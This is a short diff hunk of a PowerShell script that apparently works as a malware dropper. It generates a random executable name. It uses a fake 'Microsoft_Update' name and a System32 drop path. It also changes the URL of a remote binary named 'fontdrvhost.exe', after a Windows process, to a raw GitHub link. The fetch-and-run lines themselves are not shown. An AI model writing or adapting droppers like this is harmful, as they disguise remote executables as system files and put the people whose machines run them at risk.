@@ -8,7 +8,7 @@ $r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
 $f = "$p$m`_$r.exe"
 $t = "Microsoft_Update_$r"
 $d = "C:\Windows\System32\$f"
-$u = "https://github.com/backmrpun-hash/PS/raw/refs/heads/main/fontdrvhost.exe"
+$u = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/fontdrvhost.exe"
 
 
 $null = Read-Host "Key"
